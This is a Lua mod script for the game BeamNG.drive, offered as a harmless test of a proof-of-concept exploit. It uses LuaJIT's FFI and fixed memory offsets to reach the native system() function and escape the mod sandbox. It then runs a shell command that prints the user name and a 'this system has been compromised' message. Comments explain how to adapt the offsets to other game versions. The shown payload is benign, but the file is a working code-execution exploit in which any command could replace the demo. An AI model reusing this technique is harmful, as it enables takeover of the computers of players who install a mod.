--- Created by Anonymous275 on 6/6/2021
--- I have added this to the repo for those wanting to test changes. It has no direct involvement with nullbulge / disney.
--- This is a harmless file that can be used to test the exploit.
local M = {}

local ffi = require("ffi")

local ModuleHandleOffset = 0x13e0d0
local SystemOffset = 0x1127cdc

--- Note: this exploit will work on the current latest public version of beamNG.drive v0.22.3
--- it can be adapted to any version by adding simple if statements and making sure the offsets
--- above are correct by using ghidra, binary ninja, or any tool that will expose dll import entry points

local function onInit()
    print("exploit init!")

    --- Define the rough function signatures
    ffi.cdef[[
              typedef void* (*Handle)(const char* Name);
              typedef int (*System)(const char* Cmd);
             ]]

    --- Assume running on windows this address is static for the libbeamng dll
    local T = ffi.cast("long long*", 0x180000000 + ModuleHandleOffset)

    if T[0] < 1 then --running in wine the address is still static but different
        T = ffi.cast("long long*", 0x040C0000 + ModuleHandleOffset)
    end

    --- Since we are using a dll imported address we need to dereference it using [0]
    --- then we cast it to the function signature
    local GetModuleHandleA = ffi.cast("Handle", T[0])

    --- This is a simple cast to transform lua strings into a C char*
    local Data = ffi.cast("const char*", "BeamNG.drive.x64.exe")

    --- Here we cast the void* to the address returned by GetModuleHandleA
    --- that address is the entry point of the executable
    local GameBase = ffi.cast("long long", GetModuleHandleA(Data))

    --- We use that address and add to it the offset of the system function
    --- and cast it to the system function signature
    local system = ffi.cast("System", GameBase + SystemOffset)

    --- Finally we simply provide the argument to the function to execute
    --- voila! We have full control over the target machine!
    Data = ffi.cast("const char*", "start cmd.exe /c \"whoami && echo this system has been compromised && pause\"")

    system(Data)
end

M.onInit = onInit
return M
